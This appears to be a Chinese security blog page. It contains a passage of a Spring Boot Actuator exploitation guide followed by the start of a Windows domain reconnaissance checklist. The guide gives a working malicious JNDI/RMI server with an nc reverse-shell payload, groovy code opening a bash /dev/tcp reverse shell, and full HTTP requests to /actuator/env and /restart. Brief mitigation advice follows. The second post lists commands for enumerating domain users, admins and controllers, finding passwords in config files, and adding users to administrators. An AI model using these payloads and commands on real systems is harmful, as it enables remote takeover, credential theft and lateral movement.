<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.registry.*;</span><br><span class="line">import com.sun.jndi.rmi.registry.*;</span><br><span class="line">import javax.naming.*;</span><br><span class="line">import org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line">public class EvilRMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Creating evil RMI registry on port 8090&quot;);//RMI服务监听地址为8090</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1097);</span><br><span class="line"> </span><br><span class="line">        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span><br><span class="line">        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);</span><br><span class="line">        //redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span><br><span class="line">        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));</span><br><span class="line">        //expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span><br><span class="line">        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.233.242 1234 &gt;/tmp/f&#x27;]).start()\&quot;)&quot;));</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;jndi&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>将该代码进行maven打包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>

<p>![image-20210830204556955](Spring Boot Actuator未授权访问利用实战利用/image-20210830204556955.png)</p>
<p>然后指定访问ip地址开启RMI服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.233.242 -jar RMIServer-0.1.0.jar</span><br></pre></td></tr></table></figure>

<p>![image-20210830204855751](Spring Boot Actuator未授权访问利用实战利用/image-20210830204855751.png)</p>
<p>使用nc监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>POST方式构造请求包对/actuator/env发出请求，设置logging.config为前面example.xml的请求地址</p>
<p>![image-20210831165413164](Spring Boot Actuator未授权访问利用实战利用/image-20210831165413164.png)</p>
<p>然后再访问/actuator/restart端点重新启动项目加载变量</p>
<p>![image-20210831165556609](Spring Boot Actuator未授权访问利用实战利用/image-20210831165556609.png)</p>
<p>此时就会看到连接shell成功</p>
<p>![image-20210831165644535](Spring Boot Actuator未授权访问利用实战利用/image-20210831165644535.png)</p>
<h5 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>目标机器通过 logging.config 属性设置 logback日志配置文件 URL 地址</li>
<li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li>
<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
<li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
</ul>
<h4 id="2-11-restart-logging-config-groovy-RCE"><a href="#2-11-restart-logging-config-groovy-RCE" class="headerlink" title="2.11. restart logging.config groovy RCE"></a>2.11. restart logging.config groovy RCE</h4><h5 id="利用条件-13"><a href="#利用条件-13" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<h5 id="利用方法-12"><a href="#利用方法-12" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 groovy 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;执行代码&quot;)</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：设置 spring.main.sources 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h5 id="利用实例-10"><a href="#利用实例-10" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写groovy文件并将其放在http服务根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1&quot;)</span><br></pre></td></tr></table></figure>



<p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  -m  SimpleHTTPServer  80</span><br></pre></td></tr></table></figure>



<p>以POST的方式向/actuator/env请求，设置logging.config为groovy的url地址</p>
<p>请求报文如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20210831181920688](Spring Boot Actuator未授权访问利用实战利用/image-20210831181920688.png)</p>
<p>在攻击主机上监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>然后向/actuator/restart请求重启项目</p>
<p>![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用/image-20210831180134395.png)</p>
<p>可以看到目标主机反向连接成功</p>
<p>![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用/image-20210831180922722.png)</p>
<h5 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li><p>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</p>
</li>
<li><p>restart 重启应用后，程序会请求设置的 URL 地址</p>
</li>
<li><p>logback-classic<code>组件的</code>ch.qos.logback.classic.util.ContextInitializer.java<code>代码文件逻辑中会判断 url 是否以</code>groovy` 结尾</p>
</li>
<li><p>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</p>
</li>
</ul>
<h4 id="2-12-restart-spring-main-sources-groovy-RCE"><a href="#2-12-restart-spring-main-sources-groovy-RCE" class="headerlink" title="2.12. restart spring.main.sources groovy RCE"></a>2.12. restart spring.main.sources groovy RCE</h4><h5 id="利用条件-14"><a href="#利用条件-14" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<h5 id="利用方法-13"><a href="#利用方法-13" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一：托管 groovy 文件</strong></p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;执行代码&quot;)</span><br></pre></td></tr></table></figure>



<p><strong>步骤二：设置 spring.main.sources 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.main.sources=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：重启应用</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-11"><a href="#利用实例-11" class="headerlink" title="利用实例"></a>利用实例</h5><p>编写groovy文件并将其放在http服务根目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.233.242/1234 0&gt;&amp;1&quot;)</span><br></pre></td></tr></table></figure>



<p>使用python开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2  -m  SimpleHTTPServer  80</span><br></pre></td></tr></table></figure>



<p>以POST的方式向/actuator/env请求，设置spring.main.sources为groovy的url地址</p>
<p>请求报文如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env HTTP/1.1</span><br><span class="line">Host: 192.168.233.242:9098</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://192.168.233.242:8080/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>![image-20210831175940842](Spring Boot Actuator未授权访问利用实战利用/image-20210831175940842.png)</p>
<p>在攻击主机上监听1234端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>



<p>然后向/actuator/restart请求重启项目</p>
<p>![image-20210831180134395](Spring Boot Actuator未授权访问利用实战利用/image-20210831180134395.png)</p>
<p>可以看到目标主机反向连接成功</p>
<p>![image-20210831180922722](Spring Boot Actuator未授权访问利用实战利用/image-20210831180922722.png)</p>
<h5 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h5><ul>
<li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li>spring-boot<code>组件中的</code>org.springframework.boot.BeanDefinitionLoader.java<code>文件代码逻辑中会判断 url 是否以</code>.groovy` 结尾</li>
<li>如果 url 以 <code>.groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li>
</ul>
<h1 id="3-安全措施"><a href="#3-安全措施" class="headerlink" title="3.安全措施"></a>3.安全措施</h1><h3 id="3-1开启security依赖功能"><a href="#3-1开启security依赖功能" class="headerlink" title="3.1开启security依赖功能"></a><strong>3.1开启security依赖功能</strong></h3><p>在项目的pom.xml文件下引入spring-boot-starter-security依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;groupId&gt;org.springframework.boot\&lt;/groupId&gt;</span><br><span class="line"></span><br><span class="line">&lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;</span><br><span class="line"></span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用/b01ec604e001e1de3f668bcd86398f62.png)</p>
<p>然后在application.properties中开启security功能，配置访问账号密码，重启应用即可弹出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">management.security.enabled=true</span><br><span class="line"></span><br><span class="line">security.user.name=admin</span><br><span class="line"></span><br><span class="line">security.user.password=admin</span><br></pre></td></tr></table></figure>

<p>![](Spring Boot Actuator未授权访问利用实战利用/808449fe71e832550f82817c0ae5b3a4.png)</p>
<h3 id="3-2禁用接口"><a href="#3-2禁用接口" class="headerlink" title="3.2禁用接口"></a><strong>3.2</strong>禁用接口</h3><p>如果上述请求接口不做任何安全限制，安全隐患显而易见。实际上Spring<br>Boot也提供了安全限制功能。比如要禁用/env接口，则可设置如下：</p>
<p>endpoints.env.enabled= false</p>
<p>如果只想打开一两个接口，那就先禁用全部接口，然后启用需要的接口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">endpoints.enabled = false</span><br><span class="line"></span><br><span class="line">endpoints.metrics.enabled = true</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Windows信息收集list"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
     
    <div class="article-meta">
      <a href="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/" class="article-date">
  <time datetime="2021-10-20T12:22:48.150Z" itemprop="datePublished">2021-10-20</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Windows信息收集list"><a href="#Windows信息收集list" class="headerlink" title="Windows信息收集list"></a>Windows信息收集list</h1><h2 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h2><p>SPN即(Service Principal Names)服务器主体名称，可以理解为一个服务(如HTTP，MSSQL)等的唯一标识符，<strong>在加入域时是自动注册的</strong>，如果想使用<code>Kerberos</code>协议来认证服务，那么必须正确配置SPN。</p>
<h3 id="SPN扫描的优势"><a href="#SPN扫描的优势" class="headerlink" title="SPN扫描的优势"></a>SPN扫描的优势</h3><p>在查询SPN的时候，会向域控制器发起LDAP查询，这是正常Kerberos票据行为的一部分，所以很难被检测出来。且不需要进行大范围扫描，效率高，不需要与目标主机建立链接，可以隐蔽的同时快速发现内网中的资产以及服务。</p>
<h3 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h3><p>普通域用户即可查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain.com -Q */*</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805185944585.png" alt="image-20210805185944585"></p>
<h3 id="kerberoast工具包"><a href="#kerberoast工具包" class="headerlink" title="kerberoast工具包"></a>kerberoast工具包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nidem/kerberoast</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805194526691.png" alt="image-20210805194526691"></p>
<p><img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805194541996.png" alt="image-20210805194541996"></p>
<p>可以用于快速定位<code>域控</code>，以及排查内网中存在的<code>服务及主机</code>。</p>
<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano -p tcp</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805191040466.png" alt="image-20210805191040466"></p>
<p>利用netstat -ano命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息:</p>
<ul>
<li><p>如果通信信息是入流量，则可以获取到跳板机/堡垒机、管理员的PC来源IP、本地web应用端口等信息</p>
</li>
<li><p>如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息</p>
</li>
</ul>
<h2 id="web配置文件"><a href="#web配置文件" class="headerlink" title="web配置文件"></a>web配置文件</h2><p>一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">findstr /s /m &quot;password&quot; *.*</span><br><span class="line">下面是常用应用的默认配置路径：</span><br><span class="line"></span><br><span class="line">Tomcat:</span><br><span class="line">CATALINA_HOME/conf/tomcat-users.xml</span><br><span class="line"></span><br><span class="line">Apache:</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">Nginx:</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">Wdcp:</span><br><span class="line">/www/wdlinux/wdcp/conf/mrpw.conf</span><br><span class="line"></span><br><span class="line">Mysql:</span><br><span class="line">mysql\data\mysql\user.MYD</span><br></pre></td></tr></table></figure>

<h2 id="域网络对象信息"><a href="#域网络对象信息" class="headerlink" title="域网络对象信息"></a>域网络对象信息</h2><h3 id="判断是否有域环境"><a href="#判断是否有域环境" class="headerlink" title="判断是否有域环境"></a>判断是否有域环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 	  		 #查看网关 IP 地址、DNS 的 IP 地址、本地地址是否和 DNS 服务器为同一网段、域名</span><br><span class="line">nslookup 域名    		   #通过反向解析查询命令 nslookup 来解析域名的 IP 地址。使用解析出来的 IP 地址进行对比，判断域控制器和 DNS 服务器是否在同一台服务器上</span><br><span class="line">systeminfo        		 #域显示不为workgroup 说明有域</span><br><span class="line">net config workstation   #工作站域 DNS 名称显示域名（如果显示为 WORKGROUP，则表示非域环境）。登录域表明当前用户是域用户登录还是本地用户登录。</span><br><span class="line">net time /domain  		 #判断主域。存在域，但是当前用户不是域用户，提示拒绝访问；存在域，是域用户，提示成功完成；不存在域，提示找不到域控制器。</span><br></pre></td></tr></table></figure>

<p>/domain的命令使用条件：当前机器是域机器，当前用户是域用户</p>
<h3 id="查询域用户"><a href="#查询域用户" class="headerlink" title="查询域用户"></a>查询域用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">net group &quot;domain users&quot; /domain</span><br><span class="line">net user 域用户 /domain	  		  		  获取域用户的详细信息</span><br><span class="line">net user /domain 域用户 12345678 	  		  修改域用户密码，需要域管理员权限</span><br><span class="line">net accounts /domain                         查询域用户账户等信息</span><br></pre></td></tr></table></figure>

<h3 id="查询域管理员"><a href="#查询域管理员" class="headerlink" title="查询域管理员"></a>查询域管理员</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>

<h3 id="查询域控制器、定位域控制器"><a href="#查询域控制器、定位域控制器" class="headerlink" title="查询域控制器、定位域控制器"></a>查询域控制器、定位域控制器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<h3 id="查看域内组"><a href="#查看域内组" class="headerlink" title="查看域内组"></a>查看域内组</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>

<h3 id="查询域机器"><a href="#查询域机器" class="headerlink" title="查询域机器"></a>查询域机器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net view 				查看同一域内机器列表</span><br><span class="line">net view \\IP			查看IP的机器共享</span><br><span class="line">net view \\TEST			查看TEST计算机的共享资源列表</span><br><span class="line">net view /domain 		查看内网存在多少个域</span><br><span class="line">net view /domain:hack	查看hack域中的机器列表</span><br></pre></td></tr></table></figure>

<h2 id="本地网络对象信息"><a href="#本地网络对象信息" class="headerlink" title="本地网络对象信息"></a>本地网络对象信息</h2><h3 id="本地用户"><a href="#本地用户" class="headerlink" title="本地用户"></a>本地用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators 							查看本机管理员组成员</span><br><span class="line">net localgroup administrators /domain 					登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user01 /add		域用户添加到本机管理组</span><br></pre></td></tr></table></figure>

<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="共享-1"><a href="#共享-1" class="headerlink" title="共享"></a>共享</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>

<h3 id="Arp路由表"><a href="#Arp路由表" class="headerlink" title="Arp路由表"></a>Arp路由表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>

